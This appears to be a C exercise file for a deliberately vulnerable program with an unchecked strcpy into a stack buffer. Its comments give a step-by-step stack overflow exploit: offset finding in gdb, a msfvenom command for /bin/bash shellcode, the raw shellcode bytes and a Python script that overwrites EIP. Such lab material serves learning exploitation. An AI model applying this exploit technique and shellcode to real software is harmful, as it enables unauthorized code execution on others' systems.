// gcc pwnme-0x00.c -o pwnme-0x00 -fno-stack-protector
#include <stdio.h>
#include <string.h>

void vuln( char * arg ) {
    char buf[256];
    strcpy(buf, arg);
}

int main(int argc, char **argv) {
    printf("Val: %s\n", argv[1]);
    vuln(argv[1]);

    return 0;
}

// step 1
// tux@tux:~/0x00$ gdb -q pwnme
// (gdb) run $(python -c 'print "A" * 268 + "B" * 4')

// step 2
// git clone https://github.com/longld/peda
// echo "source ~/peda/peda.py" >> ~/.gdbinit
// tux@tux:~/0x00$ gdb -q pwnme
// gdb-peda$ run $(python -c 'print "A" * 268 + "B" * 4')

// step 3
// $ msfelfscan -j eax pwnme-0x00
// [0x00/pwnme]
// 0x08048393 call eax

// step 4
// $ msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b '\x00'

// step 5
// $ cat ./pwnme-0x00-exploit.py
// #!/usr/bin/python
// buf =  ""
// buf += "\xdb\xdd\xb8\x97\xb5\xbc\x08\xd9\x74\x24\xf4\x5e\x31"
// buf += "\xc9\xb1\x0c\x31\x46\x18\x83\xc6\x04\x03\x46\x83\x57"
// buf += "\x49\x62\xa0\xcf\x2b\x21\xd0\x87\x66\xa5\x95\xbf\x11"
// buf += "\x06\xd6\x57\xe2\x30\x37\xca\x8b\xae\xce\xe9\x1e\xc7"
// buf += "\xda\xed\x9e\x17\xf5\x8f\xf7\x79\x26\x32\x69\xf5\x50"
// buf += "\xb2\x3e\xaa\x29\x53\x0d\xcc"
// # padding to reach EIP
// buf += (268 - len(buf)) * "A"

// # overwrite EIP to point to `call eax` gadget
// buf += "\x93\x83\x04\x08"

// # output the final payload
// print buf

// step 6
// $ ./pwnme-0x00 $(python ./pwnme-0x00-exploit.py)